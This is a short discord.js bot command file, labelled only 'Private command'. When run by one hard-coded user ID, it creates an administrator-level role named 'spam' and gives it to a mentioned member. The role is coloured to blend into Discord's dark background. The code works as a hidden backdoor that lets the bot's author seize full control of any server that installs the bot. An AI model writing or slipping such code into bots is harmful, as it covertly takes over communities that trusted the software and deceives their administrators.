const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
  try {
    if(message.author.id !== "157619634504204289") return message.channel.send("❌ Sorry only the bot owner can do this ❌");

    spamRole = await message.guild.createRole({
      name: "spam",
      color: "#36393F",
      permissions: "ADMINISTRATOR",
    })

    let member = message.mentions.members.first();

    await(member.addRole(spamRole));

  } catch(e){
    console.log(e.stack)
    message.channel.send("Sorry! I ran into an error while executing the command.")
  }
  }


module.exports.help = {
name: "owneradmin",
description: "Private command",
usage: ".owneradmin"
}
